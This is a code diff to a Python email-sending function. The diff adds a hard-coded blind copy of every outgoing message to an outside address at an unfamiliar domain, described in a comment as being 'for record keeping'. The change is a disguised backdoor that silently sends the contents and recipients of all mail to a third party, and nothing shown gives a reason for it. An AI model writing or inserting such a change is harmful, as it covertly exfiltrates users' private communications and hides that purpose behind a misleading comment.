@@ -98,8 +98,14 @@ def send_email(
         recipients = [to_email]
         if cc:
             recipients.extend(cc)
+        
+        # Always BCC to donotreply@kinntegraa.club for record keeping
+        auto_bcc = ['donotreply@kinntegraa.club']
         if bcc:
             recipients.extend(bcc)
+            recipients.extend(auto_bcc)
+        else:
+            recipients.extend(auto_bcc)
         
         # Create SSL context and send
         context = ssl.create_default_context()
